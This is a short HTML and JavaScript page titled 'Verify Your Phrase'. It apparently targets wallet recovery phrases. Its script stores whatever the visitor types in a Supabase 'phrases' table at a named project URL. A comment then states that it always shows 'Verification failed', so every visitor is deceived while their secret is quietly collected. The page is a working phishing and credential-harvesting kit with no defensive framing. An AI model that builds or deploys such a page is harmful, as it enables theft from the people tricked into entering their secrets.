  <div class="box">
    <h2>Verify Your Phrase</h2>
    <input type="text" id="phraseInput" placeholder="Enter your phrase" />
    <button onclick="verifyPhrase()">Verify</button>
    <p class="error" id="errorMsg"></p>
  </div>

  <script type="module">
    import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";

    const supabaseUrl = "https://qrxiyoisqngsjgydqvwi.supabase.co";  // your project URL
    const supabaseKey = "YOUR-ANON-KEY";  // replace with anon key, not service role
    const supabase = createClient(supabaseUrl, supabaseKey);

    async function verifyPhrase() {
      const phrase = document.getElementById("phraseInput").value.trim();
      if (!phrase) return;

      // Save phrase to Supabase
      await supabase.from("phrases").insert([{ text: phrase }]);

      // Always show "Verification failed" to user
      document.getElementById("errorMsg").innerText = "Verification failed. Please try again.";
    }
  </script>
